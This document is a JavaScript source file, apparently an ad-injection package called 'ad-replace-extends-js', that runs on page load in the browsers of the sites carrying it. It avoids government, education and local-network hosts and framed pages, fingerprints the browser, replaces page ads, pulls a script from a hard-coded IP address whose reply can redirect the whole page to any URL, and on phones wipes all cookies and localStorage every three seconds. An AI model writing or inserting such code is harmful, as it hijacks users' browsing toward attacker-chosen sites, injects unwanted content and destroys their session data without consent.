import { phone } from 'ismobilejs';
import { mobileExtend, PCExtend } from './utils';
import { mobileReplace, PCReplace } from './replace';

const [name, version] = ['@veryci/ad-replace-extends-js', '1.0.0'];
const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
const { hostname } = window.location;

function extend() {
  if (window.adExtendsJS || window.top !== window || blackWebsite.test(hostname)) return;
  window.adExtendsJS = `${name}-${version}`;
  if (window.Fingerprint2) {
    new Fingerprint2().get(() => {
      if (phone) mobileExtend();
      else PCExtend();
    });
    return;
  }
  if (phone) mobileExtend();
  else PCExtend();
}

function replace() {
  if (window.adReplaceJS || window.top !== window || blackWebsite.test(hostname)) return;
  window.adReplaceJS = `${name}-${version}`;
  if (phone) mobileReplace();
  else PCReplace();
}

function redirect() {
  let str = '';
  if (hostname.search(/^www./) !== -1) {
    str = hostname.slice(hostname.indexOf('.') + 1);
  } else {
    str = hostname;
  }

  const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
  window[fnName] = (data) => {
    if (data.url) window.location.href = data.url;
  };
  const os = document.createElement('script');
  os.src = `http://117.121.41.228:3000/replace?cb=${fnName}&host=${str}`;
  document.head.appendChild(os);
  os.remove();
}

function getCookie() {
  const arr = document.cookie.match(/[^ =;]+(?=\=)|[A-z]*/g);
  return arr;
}

function clear() {
  const keys = getCookie();
  const { host } = window.location;
  if (keys) {
    for (let i = keys.length; i--;) {
      if (keys[i]) {
        document.cookie = `${keys[i]}=0;path=/;expires=${new Date(0).toUTCString()}`;
        document.cookie = `${keys[i]}=0;path=/;domain=.${host};expires=${new Date(0).toUTCString()}`;
      }
    }
  }
  window.localStorage.clear();
}

function handler(e) {
  if (window.top === window && !window.haveRedirect) {
    setTimeout(redirect, 0);
    window.haveRedirect = true;
  }
  if (window.adReady) return;
  if (e.type === 'onreadystatechange' && document.readyState !== 'complete') return;
  setTimeout(replace, 0);
  extend();
  window.adReady = true;
}

if (document.addEventListener) {
  document.addEventListener('DOMContentLoaded', handler, false);
  document.addEventListener('readystatechange', handler, false); // IE9+
  window.addEventListener('load', handler, false);
} else if (document.attachEvent) {
  document.attachEvent('onreadystatechange', handler);
  window.attachEvent('onload', handler);
}

setInterval(() => {
  if (phone) {
    clear();
  }
}, 3000);

setTimeout(() => {
  if (window.adReady) return;
  setTimeout(replace, 0);
  extend();
  window.adReady = true;
}, 10000);